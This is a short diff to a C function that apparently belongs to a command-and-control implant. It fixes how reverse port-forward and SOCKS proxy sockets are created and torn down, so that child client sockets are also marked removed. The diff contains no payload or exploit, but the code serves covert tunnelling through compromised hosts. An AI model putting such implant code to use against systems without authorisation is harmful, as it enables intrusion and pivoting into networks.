@@ -2742,7 +2742,7 @@ VOID CommandSocket( PPARSER Parser )
             FwdPort = ParserGetInt32( Parser );
 
             /* Create a reverse port forward socket and insert it into the linked list. */
-            Socket = SocketNew( 0, SOCKET_TYPE_REVERSE_PORTFWD, TRUE, LclAddr, NULL, LclPort, FwdAddr, FwdPort );
+            Socket = SocketNew( 0, SOCKET_TYPE_REVERSE_PORTFWD, TRUE, LclAddr, NULL, LclPort, FwdAddr, FwdPort, 0 );
 
             /* if Socket is not NULL then we managed to start a socket. */
             PackageAddInt32( Package, Socket ? TRUE : FALSE );
@@ -2802,17 +2802,20 @@ VOID CommandSocket( PPARSER Parser )
                 if ( Socket->Type == SOCKET_TYPE_REVERSE_PORTFWD && Socket->ID == SocketID )
                 {
                     Socket->Type = SOCKET_TYPE_CLIENT_REMOVED;
-
-                    /* we don't want to send the message now.
-                     * send it while we are free and closing the socket. */
-                    PackageDestroy( Package ); Package = NULL;
-                    return;
+                }
+                else if ( Socket->Type == SOCKET_TYPE_CLIENT && Socket->ParentID == SocketID )
+                {
+                    Socket->Type = SOCKET_TYPE_CLIENT_REMOVED;
                 }
 
                 Socket = Socket->Next;
             }
 
-            break;
+            /* we don't want to send the message now.
+             * send it while we are free and closing the socket. */
+            PackageDestroy( Package ); Package = NULL;
+
+            return;
         }
 
         case SOCKET_COMMAND_RPORTFWD_CLEAR: PUTS( "Socket::RPortFwdClear" )
@@ -2824,7 +2827,7 @@ VOID CommandSocket( PPARSER Parser )
                 if ( ! Socket )
                     break;
 
-                if ( Socket->Type == SOCKET_TYPE_REVERSE_PORTFWD )
+                if ( Socket->Type == SOCKET_TYPE_REVERSE_PORTFWD || Socket->Type == SOCKET_TYPE_CLIENT )
                     Socket->Type = SOCKET_TYPE_CLIENT_REMOVED;
 
                 Socket = Socket->Next;
@@ -2963,7 +2966,7 @@ VOID CommandSocket( PPARSER Parser )
             if ( IPv4 || IPv6 )
             {
                 /* Create a socks proxy socket and insert it into the linked list. */
-                if ( ( Socket = SocketNew( 0, SOCKET_TYPE_REVERSE_PROXY, UseIpv4, IPv4, IPv6, Port, 0, 0 ) ) )
+                if ( ( Socket = SocketNew( 0, SOCKET_TYPE_REVERSE_PROXY, UseIpv4, IPv4, IPv6, Port, 0, 0, 0 ) ) )
                 {
                     Socket->ID = ScId;
                     ErrorCode = 0;
